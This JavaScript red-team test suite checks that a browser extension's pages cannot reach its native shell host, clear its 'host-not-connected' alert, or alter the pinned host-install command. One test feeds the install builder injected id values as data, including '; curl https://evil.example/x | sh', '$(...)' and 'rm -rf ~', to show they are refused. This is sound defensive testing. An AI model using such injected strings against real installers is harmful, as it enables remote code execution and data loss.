// redteam-host-install.test.mjs — what a page must not get from the host-install flow (docs/spec/SHELL.md, "Installing
// the host"; docs/dev/site-access.md). Four properties, each stated over an ENUMERATION rather than a guessed name, so it
// stays honest as the tables grow:
//
//   A. a page reaches no shell status: every page-startable type, every shell-shaped name beside them, with `probe`,
//      `refresh` or both in the payload, is answered with nothing that names a host, and no native port is opened.
//      The positive control is the same message from an extension page, which DOES connect — so the counters are real.
//   B. a page neither posts nor dismisses the `host-not-connected` attention item: the codes are read through the
//      `ml-sessions` port (extension pages only), a page's port is closed unheard, and a flood of page messages leaves
//      the item exactly where it was, with nothing written that would clear it later.
//   C. the install line carries the pinned tag, the pinned sha256 and `chrome.runtime.id`, and nothing else: no message
//      type answers with it, `hostInstall` is imported by the settings section alone, and an id that is not 32 letters
//      a-p never reaches the line.
//   D. with ml.sh OFF (the install case) nothing starts the host at worker load, when the capabilities are assembled,
//      or when the install line is built; only the click on an extension page starts it. With ml.sh ON the load-time
//      reconnect is the person's own setting, and no page message adds to it.
//
// MUTATION PER ROW, MEASURED AT f40f789f (notes, not committed changes — one applied alone, its row watched going red, the
// source reverted, a rebuild between each; the file was clean 4/4 before and after):
//   A  the SHELL_STATUS branch's `if (!isExtensionSender(sender)) { … }` → `if (false && …)` → A red in 3.7 s with
//      "SHELL_STATUS: a page was answered with a host fact: {enabled:false,ready:false,sandboxed:false,hostSeen:true,
//      hostAnswers:true}".
//   B  `serveSessionsPort`'s `if (!isExtensionSender(port.sender))` → `if (false && …)` → B red in 54 ms:
//      "a content script's ml-sessions port was served".
//   C  `hostInstall`'s `if (!EXTENSION_ID_RE.test(extensionId)) return { ok: false, … }` deleted → C red in 72 ms:
//      "an id that is not 32 letters a-p reached the line: \"\"".
//   D  in sw-sessions.ts, `void getConfig().then((cfg) => { if (cfg.shellEnabled === true) void refreshShell(); })`
//      → `void probeShell();` at module load → D red in 89 ms:
//      "the host was started by a worker load, the capabilities or the install line".
//
// NOTE, not a row: `pin.installer.file` is not validated the way `pin.tag` and `pin.installer.sha256` are, so a tampered
// tools/host-dist.json could put shell syntax where the file name goes. It is committed and reviewed source, not a page,
// a message or the model, and the sha256 check still covers whatever the URL serves; named here so the next reader
// does not have to rediscover it.
import { test } from "node:test";
import assert from "node:assert";
import { createRequire } from "node:module";
import { readFileSync, readdirSync, statSync } from "node:fs";
import { join } from "node:path";
import { fakeNativeHost } from "./fake-native-host.mjs";

const require = createRequire(import.meta.url);
const { jsonResponse, loadBackground } = require("./helpers");
const { HANDLE_MAP, PAGE_RELAYED_EXTRA, PAGE_UNGATED_TYPES, PAGE_STARTED_TYPES } = require("../src/page-relay.ts");

const T = { timeout: 30000 };
const tick = () => new Promise((r) => setTimeout(r, 0));
/** Waits until `done()` holds, for at most `cap` macrotasks. */
async function until(done, cap = 4000) { for (let i = 0; i < cap && !done(); i++) await tick(); return done(); }
/** A send that never settles (a fire-and-forget type) answers `{timeout:true}` instead of hanging the runner. */
const bounded = (bg, msg, sender, ms = 150) => Promise.race([bg.send(msg, sender), new Promise((r) => setTimeout(() => r({ timeout: true }), ms))]);

const config = { chatUrl: "http://host/api/chat/completions", apiKey: "sk-test", model: "default-model", apiFormat: "openai", ocrModel: "" };
const PAGE = Object.freeze({ url: "chrome-extension://test/sidebar.html" });
/** A content script's sender: the page's own URL, and the tab it speaks for. */
const tab = (id, url = "https://site.example/page") => ({ tab: { id, url, title: "Site" }, url });
const ev = (hash, kind, over = {}) => ({ kind, id: hash, ts: 1, save: false, session: { hash, turn: 0 }, ...over });
const start = (hash) => ev(hash, "agent", { task: "look it up", model: "m", maxSteps: 5, config: null });

/** Everything a page can have relayed, plus every name a shell or attention surface might plausibly take. */
const GUESSES = [
    "SHELL_STATUS", "SHELL_PROBE", "SHELL_REFRESH", "SHELL_CHECK", "SHELL_INSTALL",
    "HOST_STATUS", "HOST_PROBE", "HOST_CHECK", "HOST_RECHECK", "HOST_INSTALL", "HOST_CONNECT",
    "ATTENTION", "ATTENTION_LIST", "ATTENTION_DISMISS", "DISMISS_ATTENTION",
];
/** The payload every page shape is driven with: the shell's own field names, and the attention code itself. */
const HOST_PAYLOAD = {
    probe: true, refresh: true, check: true, install: true, host: "wmlhost", hostName: "com.parawanderer.window_ml_host",
    path: "/bin/sh", code: "host-not-connected", attention: ["host-not-connected"], dismiss: "host-not-connected",
    action: "probe", id: "a".repeat(32), platform: { os: "linux", arch: "x86-64" },
};
const PAGE_TYPES = [...new Set([...Object.keys(HANDLE_MAP), ...Object.values(HANDLE_MAP).map((e) => e.type), ...PAGE_RELAYED_EXTRA, ...PAGE_UNGATED_TYPES, ...GUESSES])];
/** Anything an answer would have to carry to tell a page whether a host is installed on this machine. */
const HOST_FACTS = /hostAnswers|hostSeen|host-not-connected|wmlhost|--extension-id|install\.sh|window-ml-host/;

/** The attention codes as an extension page reads them: a fresh `ml-sessions` port's latest `runtime`. */
async function attention(bg) {
    const port = bg.connect("ml-sessions", PAGE);
    const codes = () => port.messages.filter((m) => m.type === "runtime").at(-1)?.runtime.capabilities.attention ?? [];
    await until(() => codes().length > 0);
    port.disconnect();
    return codes();
}

// --- A. a page reaches no shell status and learns nothing about a host ---

test("RED TEAM: no page-startable type, under any shell- or attention-shaped name, is handed a host fact or starts the host", T, async () => {
    const host = fakeNativeHost();
    const bg = loadBackground({ config, onNative: host.onNative, onFetch: () => jsonResponse({ data: [] }) });
    for (let i = 0; i < 10; i++) await tick();
    const connects = bg.nativeConnects.length;
    // Sensitivity: with ml.sh off, a probe from an EXTENSION page does connect, so the counter below can move.
    const control = await bg.send({ type: "SHELL_STATUS", payload: { probe: true } }, PAGE);
    assert.equal(bg.nativeConnects.length, connects + 1, "control: the extension page's probe opened the native port");
    assert.equal(control?.data?.hostAnswers, true, "control: the extension page is told the host answered");
    const afterControl = bg.nativeConnects.length;
    host.exit();
    await tick(5);

    // Every type, with every shell-shaped field at once (probe and refresh among them).
    for (const type of PAGE_TYPES) {
        const res = await bounded(bg, { type, payload: HOST_PAYLOAD, requestId: `r-${type}` }, tab(3), 120);
        assert.ok(!HOST_FACTS.test(JSON.stringify(res)), `${type}: a page was answered with a host fact: ${JSON.stringify(res)}`);
    }
    // And the shell's own words, in each shape the Settings page sends them.
    for (const type of new Set([...GUESSES, "SHELL_STATUS"])) {
        for (const payload of [{ probe: true }, { refresh: true }, { probe: true, refresh: true }, {}]) {
            const res = await bounded(bg, { type, payload, requestId: `s-${type}` }, tab(3), 120);
            assert.ok(!HOST_FACTS.test(JSON.stringify(res)), `${type} ${JSON.stringify(payload)}: a page was answered with a host fact: ${JSON.stringify(res)}`);
        }
    }
    assert.equal(bg.nativeConnects.length, afterControl, "a page-startable type opened a native port");

    // The message itself, driven from a content script: refused, with no data at all.
    for (const payload of [{ probe: true }, { refresh: true }, { probe: true, refresh: true }, {}]) {
        const res = await bg.send({ type: "SHELL_STATUS", payload }, tab(4));
        assert.deepEqual(res, { error: "Refused" }, `SHELL_STATUS ${JSON.stringify(payload)} from a content script`);
    }
    assert.equal(bg.nativeConnects.length, afterControl, "a content script's SHELL_STATUS opened a native port");
});

// --- B. a page neither posts nor dismisses the host-not-connected attention item ---

test("RED TEAM: the host-not-connected item is read only over an extension page's port, and no page message posts or dismisses it", T, async () => {
    const bg = loadBackground({ config, onFetch: () => jsonResponse({ data: [{ id: "default-model" }] }) });
    // The item is offered only once this profile has done something, so give it a session.
    void bg.send({ type: "ML_DEBUG_EVENT", event: start("ffff0001") }, tab(7));
    let before = [];
    for (let i = 0; i < 50 && !before.includes("host-not-connected"); i++) { await tick(); before = await attention(bg); }
    assert.ok(before.includes("host-not-connected"), "control: with a session and no host, the item is offered");

    // A page's own port: closed, and it hears nothing at all (the index spans every tab).
    const page = bg.connect("ml-sessions", tab(8));
    assert.equal(page.wasDisconnected(), true, "a content script's ml-sessions port was served");
    assert.deepEqual(page.messages, [], "a content script's port heard the runtime");

    const connects = bg.nativeConnects.length;
    for (const type of PAGE_TYPES) {
        await bounded(bg, { type, payload: HOST_PAYLOAD, requestId: `dismiss-${type}` }, tab(8), 60);
    }
    await tick(20);
    const after = await attention(bg);
    assert.ok(after.includes("host-not-connected"), `the item was cleared by page messages: ${JSON.stringify(after)}`);
    assert.equal(bg.nativeConnects.length, connects, "a page message opened a native port");
    // Nothing a page sent may leave a note that a host answered: that is the only way the item goes away later.
    assert.equal(bg.localStore.shellHostSeen, undefined, "a page message wrote the host-seen flag");
    assert.equal(bg.sessionStore.shellHostSeen, undefined, "a page message wrote the host-seen flag into session storage");
});

// --- C. the install line: the pin and this install's id, nothing else ---

test("RED TEAM: the install line is the pinned release plus chrome.runtime.id, no message carries it, and an id that is not 32 letters a-p is refused", T, async () => {
    const { hostInstall } = await import("../src/shell/host-install.ts");
    const pin = JSON.parse(readFileSync(new URL("../tools/host-dist.json", import.meta.url), "utf8"));
    const ID = "abcdefghijklmnopabcdefghijklmnop";
    const mac = hostInstall({ os: "mac", arch: "arm64" }, ID, pin);
    assert.equal(mac.ok, true, "control: the committed pin builds a line for an Apple-silicon Mac");
    assert.equal(mac.line,
        `f=$(mktemp) && curl -fsSL https://github.com/parawanderer/window-ml-host/releases/download/${pin.tag}/${pin.installer.file} -o "$f" && echo "${pin.installer.sha256}  $f" | shasum -a 256 -c - && sh "$f" --extension-id ${ID}`,
        "the line is not exactly the pinned tag, the pinned hash and this install's id");
    assert.equal(mac.line.split(ID).length - 1, 1, "the id is written into the line more than once");
    // Everything a shell would otherwise read as code, and every id shape that is not an extension id.
    for (const bad of [
        "", "a".repeat(31), "a".repeat(33), "A".repeat(32), "q".repeat(32), "a".repeat(31) + "q", "a".repeat(31) + "-",
        `${"a".repeat(32)}; curl https://evil.example/x | sh`, `$(${"a".repeat(32)})`, `${"a".repeat(32)} rm -rf ~`,
        `${"a".repeat(32)}\ncurl https://evil.example/x`, "a".repeat(16) + " " + "a".repeat(15),
    ]) {
        const r = hostInstall({ os: "linux", arch: "x86-64" }, bad, pin);
        assert.equal(r.ok, false, `an id that is not 32 letters a-p reached the line: ${JSON.stringify(bad)}`);
        assert.ok(!JSON.stringify(r).includes("--extension-id"), `the refusal quoted the line back: ${JSON.stringify(bad)}`);
    }

    // The line is built in the settings section from `chrome.runtime.id`, and nowhere else: no message assembles it.
    const callers = [];
    const flagSpellers = [];
    const walk = (dir) => {
        for (const name of readdirSync(dir)) {
            const p = join(dir, name);
            if (statSync(p).isDirectory()) { walk(p); continue; }
            if (!/\.(ts|tsx|mjs|js)$/.test(name) || p.endsWith("/src/shell/host-install.ts")) continue;
            const text = readFileSync(p, "utf8");
            if (/\bhostInstall\s*\(/.test(text)) callers.push(p);
            if (/--extension-id/.test(text)) flagSpellers.push(p);
        }
    };
    walk(new URL("../src", import.meta.url).pathname);
    assert.deepEqual(callers.map((p) => p.split("/src/")[1]), ["sidebar/settings/shell-section.tsx"],
        "a second place builds the install line");
    assert.deepEqual(flagSpellers.map((p) => p.split("/src/")[1]).filter((p) => p !== "sidebar/settings/host-install-guide.tsx"), [],
        "a file outside the module that owns the line spells its flag (the guide's @gallery sample is the one allowed copy)");
    assert.match(readFileSync(new URL("../src/sidebar/settings/shell-section.tsx", import.meta.url), "utf8"),
        /chrome\.runtime\?\.id/, "the settings section no longer reads the id from chrome.runtime");

    // And behaviourally: no message type answers with the line, from either sender shape.
    const bg = loadBackground({ config, onFetch: () => jsonResponse({ data: [] }) });
    for (const sender of [tab(5), PAGE]) {
        for (const type of [...PAGE_TYPES, "SHELL_STATUS", "GET_CONFIG", "HUB_RUNTIME", "DUMP_RUN_LOG"]) {
            const res = await bounded(bg, { type, payload: HOST_PAYLOAD }, sender, 150);
            assert.ok(!/--extension-id|install\.sh/.test(JSON.stringify(res)), `${type} answered with the install line`);
        }
    }
});

// --- D. what starts the host: the click, and the person's own setting at load — never a page, never the drawing ---

test("RED TEAM: with ml.sh off nothing starts the host at load, on the capabilities, or when the install line is built; the click does", T, async () => {
    const { hostInstall } = await import("../src/shell/host-install.ts");
    const pin = JSON.parse(readFileSync(new URL("../tools/host-dist.json", import.meta.url), "utf8"));
    const host = fakeNativeHost();
    const bg = loadBackground({ config, onNative: host.onNative, onFetch: () => jsonResponse({ data: [{ id: "default-model" }] }) });
    // The install case: ml.sh off, and a session so the attention list has something to compute.
    void bg.send({ type: "ML_DEBUG_EVENT", event: start("ffff0002") }, tab(7));
    assert.equal((await attention(bg)).length > 0, true, "control: the capabilities were assembled (attention codes are there)");
    const install = hostInstall({ os: "mac", arch: "arm64" }, "a".repeat(32), pin);
    assert.equal(install.ok, true, "control: the line was built");
    await tick(30);
    assert.equal(bg.nativeConnects.length, 0, "the host was started by a worker load, the capabilities or the install line");

    // The click on the extension page is the one thing that starts it.
    const r = await bg.send({ type: "SHELL_STATUS", payload: { probe: true } }, PAGE);
    assert.equal(r?.data?.hostAnswers, true);
    assert.equal(bg.nativeConnects.length, 1, "the click did not start the host");
    assert.deepEqual(host.names(), ["hello"], "the click did more than say hello");

    // With ml.sh ON the load-time reconnect is the person's setting: one connection, and no page message adds another.
    const on = fakeNativeHost();
    const bg2 = loadBackground({ config: { ...config, shellEnabled: true, shellRoots: ["/w/proj"] }, onNative: on.onNative, onFetch: () => jsonResponse({ data: [{ id: "default-model" }] }) });
    for (let i = 0; i < 50 && bg2.nativeConnects.length === 0; i++) await tick();
    assert.equal(bg2.nativeConnects.length, 1, "a worker with ml.sh on did not reconnect to the host it was configured with");
    assert.deepEqual(bg2.nativeConnects, ["com.parawanderer.window_ml_host"], "the connection is not to the pinned host");
    const connects = bg2.nativeConnects.length;
    for (const type of [...PAGE_TYPES, "SHELL_STATUS"]) {
        await bounded(bg2, { type, payload: HOST_PAYLOAD }, tab(6), 60);
    }
    await tick(20);
    assert.equal(bg2.nativeConnects.length, connects, "a page message added a connection to a live host");
});
